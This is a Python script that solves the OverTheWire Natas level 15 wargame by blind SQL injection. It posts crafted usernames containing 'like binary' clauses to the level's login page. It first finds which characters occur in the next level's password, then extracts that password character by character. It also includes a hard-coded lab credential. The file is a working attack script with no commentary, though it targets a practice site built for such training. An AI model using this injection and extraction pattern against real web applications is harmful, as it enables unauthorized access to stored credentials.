import requests
from requests.auth import HTTPBasicAuth

# chars='abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
#
# key=''
#
# for i in range (0,32):
#     for char in chars:
#         #print(char)
#         data= {'username': 'natas16" and password like binary "'+key+char+'%" #', 'password': ''}
#         r=requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data=data)
#         #print(r.text)
#         if "exists" in r.text:
#             key=key+char
#             print(key)
#             break

chars='abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';

key=''
select=''

for char in chars:
    data= {'username': 'natas16" and password like binary "%'+char+'%" #', 'password': ''}
    r=requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data=data)
    if "exists" in r.text:
            select=select+char


for i in range (0,32):
    for char in select:
        #print(char)
        data= {'username': 'natas16" and password like binary "'+key+char+'%" #', 'password': ''}
        r=requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data=data)
        #print(r.text)
        if "exists" in r.text:
            key=key+char
            print(key)
            break

